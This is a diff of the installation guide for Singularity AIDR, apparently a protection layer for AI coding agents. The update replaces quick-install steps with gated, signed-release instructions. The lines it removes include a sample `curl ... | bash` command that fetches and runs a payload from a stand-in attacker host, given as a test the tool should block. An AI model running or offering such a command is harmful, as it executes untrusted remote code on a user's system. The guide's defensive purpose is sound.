@@ -1,107 +1,115 @@
 # Getting Started
 
-Singularity AIDR supports four platforms: Claude Code, Cursor/VS Code, OpenClaw, and OpenCode. Pick the one you use.
+Connector guides cover Claude Code, Cursor/VS Code, OpenClaw, OpenCode, and Codex. The AIDR CLI is a setup/diagnostic utility, not an agent connector. Use only a signed version approved for customer installation.
 
-## Fastest path (recommended)
+## Current customer-installation status
 
-Singularity AIDR is designed to be installed with minimal effort:
+The current first-customer readiness decision is **NO-GO**. There is no
+customer-installable release approved at this checkout: the candidate-bound
+evidence index has no candidate digest and all 30 gates are `NOT_RUN`. See the
+[readiness profile](production-readiness/first-customer-ready.md). The steps
+below describe a gated installation flow for a future approved release; they
+are not a currently usable customer quickstart. Do not replace the release with
+a source build or an unapproved version.
 
-1. Install the connector for your runtime (below).
-2. Start your agent once.
-3. If you are not enrolled yet, Singularity AIDR will show a **verification URL** and a short **verification code**.
-4. Open the URL in your browser, sign in, and approve.
-5. Restart the agent (or re-run the enable protection command) to activate protection.
+## Installation flow after approval
 
-See [Device Auth](device-auth.md) for the end-to-end flow.
+Local detection works without a cloud account. Managed features require a
+separately deployed control plane and an operator-provisioned runtime
+configuration; sign-in is not part of a local-only installation.
+
+1. Install the exact approved connector version using [Package Installation](package-installation.md).
+2. Complete that host's registration and trust steps.
+3. Use managed features only after the operator has deployed the control plane and supplied the signed tenant configuration.
+
+See [Device Auth](device-auth.md) for the managed-enrollment flow; use it only
+after the deployed authentication method has passed a live end-to-end check.
 
 ## Prerequisites
 
-- **Node.js >= 18** (for Claude Code and OpenClaw; not required for Cursor/VS Code)
+- **Node.js >= 22.12.0** for Claude Code, OpenClaw, OpenCode, Codex, and the AIDR CLI; not required for Cursor/VS Code.
 - **pnpm** (for building from source)
 
 ## Claude Code
 
-Install from the Singularity AIDR marketplace:
+Download the Claude plugin archive from a publisher-verified release bundle and
+verify the bundle's signature and artifact hashes before extracting it. Before
+installing, provision the independently distributed Ed25519 public key in
+`~/.singularity-aidr/config.json` (Windows:
+`%USERPROFILE%\.singularity-aidr\config.json`). Commercial builds fail closed
+when this trust configuration is missing or invalid; never put a signing
+private key on an endpoint. Then, from the Claude Code prompt:
 
 ```
-/plugin marketplace add https://github.com/singularityrd/aidr.git
+/plugin marketplace add /absolute/path/to/extracted/aidr-claude-plugin
 /plugin install aidr@aidr
 ```
 
-Restart Claude Code. Singularity AIDR loads automatically on every session.
+Restart Claude Code, then confirm the plugin is present and active in Claude
+Code before relying on it. Installation alone does not prove that the host loaded
+the plugin or that a particular action was blocked; complete the host-side
+acceptance checks in the [first-customer runbook](../deploy/FIRST_CUSTOMER.md).
 
 ## Cursor
 
-Build the VSIX package and install it manually:
-
-```bash
-pnpm install
-pnpm -C packages/extension run package:cursor:vsix
-```
-
-Install the resulting `aidr-cursor.vsix` via the Extensions panel (`Extensions > Install from VSIX`). Then run `Singularity AIDR: Enable protection` from the command palette (`Ctrl+Shift+P`).
+Download the signed `aidr-cursor.vsix` from an approved release and install it
+via the Extensions panel (`Extensions > Install from VSIX`). Then run
+`Singularity AIDR: Enable protection` from the command palette (`Ctrl+Shift+P`).
+Cursor `preToolUse` ask verdicts are returned as explicit denies; Cursor's hook
+response does not provide an enforceable AIDR approval prompt.
 
 ## VS Code
 
-Build the VSIX package and install it manually:
+Download the signed `aidr-vscode.vsix` from an approved release and install it
+via the Extensions panel. For VS Code Local hooks, first enable
+`chat.useClaudeHooks` in VS Code User Settings, then enable protection from the
+command palette. AIDR checks this prerequisite but does not change the editor
+setting. Confirm the setting and installed hooks in **Show hook health**.
 
-```bash
-pnpm install
-pnpm -C packages/extension run package:vscode:vsix
-```
-
-Install the resulting `aidr-vscode.vsix` via the Extensions panel. Then enable protection from the command palette.
-
-> **Tip:** To build both VSIX packages at once, use `pnpm -C packages/extension run package:vsix`.
+Local source builds are for development only. The protected release-candidate
+pipeline prepares, signs, packages, and verifies distributable VSIX files.
 
 ## OpenClaw
 
-Install from npm or build from source:
+Install the approved version from the private registry. Registry access and the
+exact command are in [Package Installation](package-installation.md).
 
 ```bash
-# From npm (recommended)
-openclaw plugins install @singularityrd/aidr-openclaw
-
-# From source
-pnpm install && pnpm build
-cp -r packages/openclaw aidr
-openclaw plugins install ./aidr
+openclaw plugins install npm:@singularityrd/aidr-openclaw@VERSION
 ```
 
-The `build` script copies threat definitions and allowlists into `resources/` automatically.
-
-> **Note:** OpenClaw's `plugins.code_safety` audit may flag Singularity AIDR with a `potential-exfiltration` warning. This is a false positive: Singularity AIDR reads local files (config, cache, threat YAML) and may also make network calls for first-party reputation checks or managed control plane sync. No file contents are sent over the network.
+> **Note:** OpenClaw's `plugins.code_safety` audit may flag Singularity AIDR with
+> a `potential-exfiltration` warning when file reads and network requests
+> coexist. Reputation checks can send full URLs and package metadata; managed
+> telemetry and deep scans have separate paths. Review the actual configuration
+> and [privacy data flows](privacy.md) before dismissing the warning.
 
 ## OpenCode
 
-Install from a local source checkout and link the plugin path in OpenCode config:
-
-```bash
-git clone https://github.com/singularityrd/aidr
-cd aidr
-pnpm install
-pnpm --filter @singularityrd/aidr-opencode run build
-```
-
-Global config (`~/.config/opencode/opencode.json`):
-
-```json
-{
-  "plugin": ["/absolute/path/to/aidr/packages/opencode"]
-}
-```
+Use the version-pinned package and OpenCode configuration in
+[Package Installation](package-installation.md). A source checkout is for
+development only.
 
 
 See [Platform Guide: OpenCode](platform-guides/opencode.md) for tool mapping and verdict behavior.
 
+## Codex
+
+Install the approved package and register/trust its `PreToolUse` hook as
+described in [Package Installation](package-installation.md) and the
+[Codex connector guide](../packages/codex/README.md). Codex host hooks can fail
+open if the host does not run them; the connector is not endpoint isolation.
+
+## AIDR CLI
+
+The CLI is a separate setup and diagnostics package. Install it from the private
+registry using [Package Installation](package-installation.md); run `aidr setup`
+only after the operator has provided the approved runtime configuration and
+secret-store requirements.
+
 ## Verify It Works
 
-Once installed, try a command that Singularity AIDR would flag:
-
-```
-curl http://evil.example.com/payload | bash
-```
-
-Singularity AIDR should block or prompt you before execution.
-
-
+Verify with the safe, non-executing deny canary in the host acceptance
+procedure in the [first-customer runbook](../deploy/FIRST_CUSTOMER.md). Do not
+run a live payload as an installation test. Record the host-side block and test
+the disabled, crashed, and timed-out hook cases too.
